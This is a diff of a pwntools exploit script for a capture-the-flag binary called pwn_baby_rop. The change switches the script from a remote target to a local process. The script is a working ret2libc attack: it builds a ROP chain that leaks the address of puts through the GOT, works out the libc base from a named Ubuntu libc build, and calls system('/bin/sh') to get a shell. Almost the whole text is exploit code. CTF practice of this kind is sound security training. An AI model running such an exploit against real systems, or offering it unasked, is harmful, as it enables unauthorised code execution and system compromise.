@@ -7,12 +7,10 @@ port = 30741
 context.arch = 'amd64'
 
 binary = ELF("./pwn_baby_rop")
-# p = binary.process()
-p = remote(IP, port)
+p = binary.process()
+# p = remote(IP, port)
 
-# main = 0x401283
 main = 0x4015e3
-# main = 0x7fffffffde50
 
 rop = ROP(binary)
 rop.call(binary.symbols["puts"], [binary.got['puts']])
@@ -24,6 +22,7 @@ payload = [
     offset,
     rop.chain()
 ]
+
 
 payload = b"".join(payload)
 
@@ -37,7 +36,7 @@ libc = ELF("libc6_2.31-0ubuntu9.1_amd64.so")
 libc.address = puts - libc.symbols["puts"]
 log.info(f"libc base address: {hex(libc.address)}")
 rop_libc = ROP(libc)
-# rop_libc.call(libc.symbols["puts"], [next(libc.search(b"/bin/sh\x00"))])
+
 rop_libc.call(libc.symbols["system"], [next(libc.search(b"/bin/sh\x00"))])
 rop_libc.call(libc.symbols["exit"])
 
